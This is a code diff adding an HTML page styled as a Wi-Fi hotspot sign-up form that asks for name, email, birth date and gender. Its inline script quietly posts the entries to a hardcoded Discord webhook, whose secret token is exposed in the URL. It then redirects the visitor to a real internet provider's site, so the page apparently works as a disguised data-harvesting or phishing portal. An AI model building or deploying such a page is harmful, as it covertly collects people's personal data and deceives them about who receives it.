@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>rr</title>
+    <link rel="stylesheet" href="nr.css">
+</head>
+<body>
+    <section class="container">
+        <header>Hotspot Data Collect</header>
+        <form action="#" class="form" onsubmit="sendMessage(); return false;">
+            <div class="input-box">
+                <label>Full Name</label>
+                <input type="text" id="name" placeholder="Enter full name">
+            </div>
+            <div class="input-box">
+                <label>Email</label>
+                <input type="email" id="email" placeholder="Enter your email">
+            </div>
+            <div class="input-box">
+                <label>Birth date</label>
+                <input type="date" id="date" placeholder="Enter birth date">
+            </div>
+            <div class="gender-box">
+                <h3>Gender</h3>
+                <div class="gender-option">
+                    <div class="gender">
+                        <input type="radio" id="check-male" name="gender" value="male">
+                        <label for="check-male">Male</label>                    
+                    </div>
+                    <div class="gender">
+                        <input type="radio" id="check-female" name="gender" value="female">
+                        <label for="check-female">Female</label>                    
+                    </div>
+                    <div class="gender">
+                        <input type="radio" id="check-other" name="gender" value="other">
+                        <label for="check-other">Secret</label>                    
+                    </div>
+                </div>
+            </div>
+            <button type="submit">Submit</button>
+            <p>copyright@hrms.101</p>
+        </form>
+    </section>
+
+    <script>
+        function sendMessage() {
+            let name = document.getElementById('name').value;
+            let email = document.getElementById('email').value;
+            let date = document.getElementById('date').value;
+            let gender = document.querySelector('input[name="gender"]:checked').value;
+            
+            const contents = 
+            `name: ${name}
+email: ${email}
+date: ${date}
+gender: ${gender}
+        
+==================================`;
+    
+            const request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/1221353740498374697/gokYrOyqt5lyIoO8ubl1AKOhEBWbrPZO8aMX2Lrzga09ZN47GSClzyqEoWMMcz8FBgP4");
+            request.setRequestHeader('Content-type', 'application/json');
+    
+            const params = {
+                content: contents
+            };
+    
+            request.send(JSON.stringify(params));
+    
+            // Prevent form submission (page reload)
+            window.location.href = "https://www.globalxtreme.net/";
+            return false;
+        }
+    </script>
+</body>
+</html>
